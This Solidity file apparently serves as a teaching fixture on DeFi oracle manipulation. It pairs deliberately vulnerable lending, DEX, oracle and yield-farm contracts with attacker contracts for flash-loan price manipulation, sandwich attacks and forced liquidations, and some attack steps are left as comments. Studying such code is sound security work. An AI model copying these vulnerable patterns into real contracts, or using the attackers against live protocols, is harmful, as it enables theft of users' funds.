// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title OracleManipulationVulnerable
 * @dev Demonstrates various oracle manipulation vulnerabilities
 * 
 * Vulnerabilities demonstrated:
 * 1. Single oracle dependency
 * 2. No price validation or sanity checks
 * 3. Flash loan price manipulation
 * 4. Stale price data usage
 * 5. Lack of circuit breakers
 * 6. Insufficient price deviation checks
 * 7. Vulnerable to sandwich attacks
 * 8. No time-weighted average price (TWAP)
 * 9. Centralized oracle risks
 * 10. Missing oracle failure handling
 */

interface IVulnerableOracle {
    function getPrice(address token) external view returns (uint256);
    function getLastUpdate(address token) external view returns (uint256);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFlashLoanProvider {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

/**
 * @dev Vulnerable oracle that can be easily manipulated
 */
contract VulnerableOracle is IVulnerableOracle {
    mapping(address => uint256) public prices;
    mapping(address => uint256) public lastUpdates;
    address public owner;
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor() {
        owner = msg.sender;
    }
    
    function updatePrice(address token, uint256 price) external onlyOwner {
        prices[token] = price;
        lastUpdates[token] = block.timestamp;
    }
    
    function getPrice(address token) external view override returns (uint256) {
        return prices[token];
    }
    
    function getLastUpdate(address token) external view override returns (uint256) {
        return lastUpdates[token];
    }
}

/**
 * @dev Vulnerable lending protocol that relies on single oracle
 */
contract VulnerableLendingProtocol {
    IVulnerableOracle public oracle;
    IERC20 public collateralToken;
    IERC20 public borrowToken;
    
    mapping(address => uint256) public collateralBalances;
    mapping(address => uint256) public borrowBalances;
    
    uint256 public constant COLLATERAL_RATIO = 150; // 150% collateralization
    uint256 public constant LIQUIDATION_THRESHOLD = 120; // 120% liquidation threshold
    
    event Deposit(address indexed user, uint256 amount);
    event Borrow(address indexed user, uint256 amount);
    event Liquidate(address indexed liquidator, address indexed user, uint256 amount);
    
    constructor(
        address _oracle,
        address _collateralToken,
        address _borrowToken
    ) {
        oracle = IVulnerableOracle(_oracle);
        collateralToken = IERC20(_collateralToken);
        borrowToken = IERC20(_borrowToken);
    }
    
    /**
     * @dev Vulnerable deposit function - no validation
     */
    function deposit(uint256 amount) external {
        require(amount > 0, "Amount must be positive");
        
        collateralToken.transferFrom(msg.sender, address(this), amount);
        collateralBalances[msg.sender] += amount;
        
        emit Deposit(msg.sender, amount);
    }
    
    /**
     * @dev Vulnerable borrow function - relies on single oracle
     */
    function borrow(uint256 amount) external {
        require(amount > 0, "Amount must be positive");
        
        uint256 collateralValue = getCollateralValue(msg.sender);
        uint256 borrowValue = getBorrowValue(msg.sender) + (amount * getBorrowTokenPrice());
        
        // Vulnerable: No price validation or circuit breakers
        require(
            borrowValue * 100 <= collateralValue * 100 / COLLATERAL_RATIO,
            "Insufficient collateral"
        );
        
        borrowBalances[msg.sender] += amount;
        borrowToken.transfer(msg.sender, amount);
        
        emit Borrow(msg.sender, amount);
    }
    
    /**
     * @dev Vulnerable liquidation function
     */
    function liquidate(address user, uint256 amount) external {
        uint256 collateralValue = getCollateralValue(user);
        uint256 borrowValue = getBorrowValue(user);
        
        // Vulnerable: Uses current price without validation
        require(
            borrowValue * 100 > collateralValue * 100 / LIQUIDATION_THRESHOLD,
            "Position is healthy"
        );
        
        require(amount <= borrowBalances[user], "Amount exceeds debt");
        
        // Calculate collateral to seize (with bonus)
        uint256 collateralPrice = getCollateralTokenPrice();
        uint256 borrowPrice = getBorrowTokenPrice();
        uint256 collateralToSeize = (amount * borrowPrice * 105) / (collateralPrice * 100); // 5% bonus
        
        require(collateralToSeize <= collateralBalances[user], "Insufficient collateral");
        
        // Transfer debt token from liquidator
        borrowToken.transferFrom(msg.sender, address(this), amount);
        
        // Transfer collateral to liquidator
        collateralToken.transfer(msg.sender, collateralToSeize);
        
        // Update balances
        borrowBalances[user] -= amount;
        collateralBalances[user] -= collateralToSeize;
        
        emit Liquidate(msg.sender, user, amount);
    }
    
    /**
     * @dev Vulnerable price fetching - no validation
     */
    function getCollateralTokenPrice() public view returns (uint256) {
        return oracle.getPrice(address(collateralToken));
    }
    
    function getBorrowTokenPrice() public view returns (uint256) {
        return oracle.getPrice(address(borrowToken));
    }
    
    function getCollateralValue(address user) public view returns (uint256) {
        return collateralBalances[user] * getCollateralTokenPrice();
    }
    
    function getBorrowValue(address user) public view returns (uint256) {
        return borrowBalances[user] * getBorrowTokenPrice();
    }
    
    function getHealthFactor(address user) external view returns (uint256) {
        uint256 borrowValue = getBorrowValue(user);
        if (borrowValue == 0) return type(uint256).max;
        
        uint256 collateralValue = getCollateralValue(user);
        return (collateralValue * 100) / borrowValue;
    }
}

/**
 * @dev Vulnerable DEX that can be manipulated
 */
contract VulnerableDEX {
    IERC20 public tokenA;
    IERC20 public tokenB;
    
    uint256 public reserveA;
    uint256 public reserveB;
    
    event Swap(address indexed user, uint256 amountIn, uint256 amountOut, bool aToB);
    event AddLiquidity(address indexed user, uint256 amountA, uint256 amountB);
    
    constructor(address _tokenA, address _tokenB) {
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
    }
    
    function addLiquidity(uint256 amountA, uint256 amountB) external {
        tokenA.transferFrom(msg.sender, address(this), amountA);
        tokenB.transferFrom(msg.sender, address(this), amountB);
        
        reserveA += amountA;
        reserveB += amountB;
        
        emit AddLiquidity(msg.sender, amountA, amountB);
    }
    
    /**
     * @dev Vulnerable swap function - can be manipulated in single transaction
     */
    function swapAToB(uint256 amountIn) external {
        require(amountIn > 0, "Amount must be positive");
        require(reserveA > 0 && reserveB > 0, "No liquidity");
        
        // Simple constant product formula (vulnerable to manipulation)
        uint256 amountOut = (amountIn * reserveB) / (reserveA + amountIn);
        require(amountOut > 0, "Insufficient output");
        
        tokenA.transferFrom(msg.sender, address(this), amountIn);
        tokenB.transfer(msg.sender, amountOut);
        
        reserveA += amountIn;
        reserveB -= amountOut;
        
        emit Swap(msg.sender, amountIn, amountOut, true);
    }
    
    function swapBToA(uint256 amountIn) external {
        require(amountIn > 0, "Amount must be positive");
        require(reserveA > 0 && reserveB > 0, "No liquidity");
        
        uint256 amountOut = (amountIn * reserveA) / (reserveB + amountIn);
        require(amountOut > 0, "Insufficient output");
        
        tokenB.transferFrom(msg.sender, address(this), amountIn);
        tokenA.transfer(msg.sender, amountOut);
        
        reserveB += amountIn;
        reserveA -= amountOut;
        
        emit Swap(msg.sender, amountIn, amountOut, false);
    }
    
    function getPrice() external view returns (uint256) {
        if (reserveA == 0) return 0;
        return (reserveB * 1e18) / reserveA;
    }
}

/**
 * @dev Oracle that uses DEX price (vulnerable to manipulation)
 */
contract DEXOracle {
    VulnerableDEX public dex;
    
    constructor(address _dex) {
        dex = VulnerableDEX(_dex);
    }
    
    function getPrice(address) external view returns (uint256) {
        return dex.getPrice();
    }
}

/**
 * @dev Flash loan attacker contract
 */
contract OracleManipulationAttacker {
    VulnerableLendingProtocol public lendingProtocol;
    VulnerableDEX public dex;
    IFlashLoanProvider public flashLoanProvider;
    IERC20 public collateralToken;
    IERC20 public borrowToken;
    
    constructor(
        address _lendingProtocol,
        address _dex,
        address _flashLoanProvider,
        address _collateralToken,
        address _borrowToken
    ) {
        lendingProtocol = VulnerableLendingProtocol(_lendingProtocol);
        dex = VulnerableDEX(_dex);
        flashLoanProvider = IFlashLoanProvider(_flashLoanProvider);
        collateralToken = IERC20(_collateralToken);
        borrowToken = IERC20(_borrowToken);
    }
    
    /**
     * @dev Execute oracle manipulation attack
     */
    function executeAttack(uint256 flashLoanAmount) external {
        // Step 1: Take flash loan
        flashLoanProvider.flashLoan(
            address(collateralToken),
            flashLoanAmount,
            abi.encode("ORACLE_ATTACK")
        );
    }
    
    /**
     * @dev Flash loan callback
     */
    function onFlashLoan(
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external {
        require(msg.sender == address(flashLoanProvider), "Unauthorized");
        
        // Step 2: Manipulate DEX price by large swap
        collateralToken.approve(address(dex), amount);
        dex.swapAToB(amount / 2); // Manipulate price down
        
        // Step 3: Liquidate positions at manipulated price
        // (This would target specific users with positions)
        
        // Step 4: Reverse the swap to restore price
        uint256 borrowTokenBalance = borrowToken.balanceOf(address(this));
        borrowToken.approve(address(dex), borrowTokenBalance);
        dex.swapBToA(borrowTokenBalance);
        
        // Step 5: Repay flash loan
        collateralToken.transfer(address(flashLoanProvider), amount + fee);
    }
}

/**
 * @dev Sandwich attack contract
 */
contract SandwichAttacker {
    VulnerableDEX public dex;
    IERC20 public tokenA;
    IERC20 public tokenB;
    
    constructor(address _dex, address _tokenA, address _tokenB) {
        dex = VulnerableDEX(_dex);
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
    }
    
    /**
     * @dev Execute sandwich attack
     */
    function executeSandwichAttack(
        uint256 frontRunAmount,
        uint256 victimAmount,
        bool isAToB
    ) external {
        if (isAToB) {
            // Front-run: Buy before victim
            tokenA.approve(address(dex), frontRunAmount);
            dex.swapAToB(frontRunAmount);
            
            // Victim's transaction happens here (simulated)
            // This would be done by monitoring mempool and front-running
            
            // Back-run: Sell after victim at higher price
            uint256 tokenBBalance = tokenB.balanceOf(address(this));
            tokenB.approve(address(dex), tokenBBalance);
            dex.swapBToA(tokenBBalance);
        } else {
            // Similar logic for B to A swaps
            tokenB.approve(address(dex), frontRunAmount);
            dex.swapBToA(frontRunAmount);
            
            uint256 tokenABalance = tokenA.balanceOf(address(this));
            tokenA.approve(address(dex), tokenABalance);
            dex.swapAToB(tokenABalance);
        }
    }
}

/**
 * @dev Vulnerable yield farming contract
 */
contract VulnerableYieldFarm {
    IVulnerableOracle public oracle;
    IERC20 public stakingToken;
    IERC20 public rewardToken;
    
    mapping(address => uint256) public stakedBalances;
    mapping(address => uint256) public lastRewardTime;
    
    uint256 public rewardRate = 100; // Rewards per second per token
    
    constructor(
        address _oracle,
        address _stakingToken,
        address _rewardToken
    ) {
        oracle = IVulnerableOracle(_oracle);
        stakingToken = IERC20(_stakingToken);
        rewardToken = IERC20(_rewardToken);
    }
    
    function stake(uint256 amount) external {
        require(amount > 0, "Amount must be positive");
        
        stakingToken.transferFrom(msg.sender, address(this), amount);
        
        // Claim pending rewards first
        claimRewards();
        
        stakedBalances[msg.sender] += amount;
        lastRewardTime[msg.sender] = block.timestamp;
    }
    
    /**
     * @dev Vulnerable reward calculation based on oracle price
     */
    function claimRewards() public {
        uint256 stakedAmount = stakedBalances[msg.sender];
        if (stakedAmount == 0) return;
        
        uint256 timeElapsed = block.timestamp - lastRewardTime[msg.sender];
        if (timeElapsed == 0) return;
        
        // Vulnerable: Reward calculation based on current price
        uint256 tokenPrice = oracle.getPrice(address(stakingToken));
        uint256 baseReward = (stakedAmount * timeElapsed * rewardRate) / 1e18;
        
        // Bonus based on token price (vulnerable to manipulation)
        uint256 priceBonus = (baseReward * tokenPrice) / 1e18;
        uint256 totalReward = baseReward + priceBonus;
        
        lastRewardTime[msg.sender] = block.timestamp;
        rewardToken.transfer(msg.sender, totalReward);
    }
    
    function unstake(uint256 amount) external {
        require(amount <= stakedBalances[msg.sender], "Insufficient balance");
        
        claimRewards();
        
        stakedBalances[msg.sender] -= amount;
        stakingToken.transfer(msg.sender, amount);
    }
}

/**
 * @dev Demonstration contract for oracle manipulation
 */
contract OracleManipulationDemo {
    VulnerableOracle public oracle;
    VulnerableLendingProtocol public lendingProtocol;
    VulnerableDEX public dex;
    VulnerableYieldFarm public yieldFarm;
    
    IERC20 public tokenA;
    IERC20 public tokenB;
    
    event AttackExecuted(string attackType, uint256 profit);
    event PriceManipulated(address token, uint256 oldPrice, uint256 newPrice);
    
    constructor(
        address _oracle,
        address _lendingProtocol,
        address _dex,
        address _yieldFarm,
        address _tokenA,
        address _tokenB
    ) {
        oracle = VulnerableOracle(_oracle);
        lendingProtocol = VulnerableLendingProtocol(_lendingProtocol);
        dex = VulnerableDEX(_dex);
        yieldFarm = VulnerableYieldFarm(_yieldFarm);
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
    }
    
    /**
     * @dev Demonstrate price manipulation attack
     */
    function demonstratePriceManipulation() public {
        uint256 oldPrice = oracle.getPrice(address(tokenA));
        
        // Manipulate DEX to change oracle price
        uint256 manipulationAmount = tokenA.balanceOf(address(this)) / 2;
        tokenA.approve(address(dex), manipulationAmount);
        dex.swapAToB(manipulationAmount);
        
        uint256 newPrice = dex.getPrice();
        
        emit PriceManipulated(address(tokenA), oldPrice, newPrice);
    }
    
    /**
     * @dev Demonstrate liquidation attack
     */
    function demonstrateLiquidationAttack(address victim) external {
        uint256 initialBalance = tokenB.balanceOf(address(this));
        
        // Manipulate price to make victim liquidatable
        demonstratePriceManipulation();
        
        // Liquidate victim
        uint256 debtAmount = lendingProtocol.borrowBalances(victim);
        if (debtAmount > 0) {
            tokenB.approve(address(lendingProtocol), debtAmount);
            lendingProtocol.liquidate(victim, debtAmount);
        }
        
        uint256 finalBalance = tokenB.balanceOf(address(this));
        uint256 profit = finalBalance > initialBalance ? finalBalance - initialBalance : 0;
        
        emit AttackExecuted("Liquidation Attack", profit);
    }
    
    /**
     * @dev Demonstrate yield farming manipulation
     */
    function demonstrateYieldFarmingAttack() external {
        uint256 initialRewardBalance = tokenB.balanceOf(address(this));
        
        // Stake tokens
        uint256 stakeAmount = tokenA.balanceOf(address(this)) / 4;
        tokenA.approve(address(yieldFarm), stakeAmount);
        yieldFarm.stake(stakeAmount);
        
        // Wait some time (simulated)
        // vm.warp(block.timestamp + 3600); // 1 hour - commented out for compilation
        
        // Manipulate price before claiming rewards
        demonstratePriceManipulation();
        
        // Claim inflated rewards
        yieldFarm.claimRewards();
        
        uint256 finalRewardBalance = tokenB.balanceOf(address(this));
        uint256 profit = finalRewardBalance > initialRewardBalance ? 
            finalRewardBalance - initialRewardBalance : 0;
        
        emit AttackExecuted("Yield Farming Attack", profit);
    }
    
    // Helper function for testing
    function vm() internal pure returns (Vm) {
        return Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    }
}

interface Vm {
    function warp(uint256) external;
}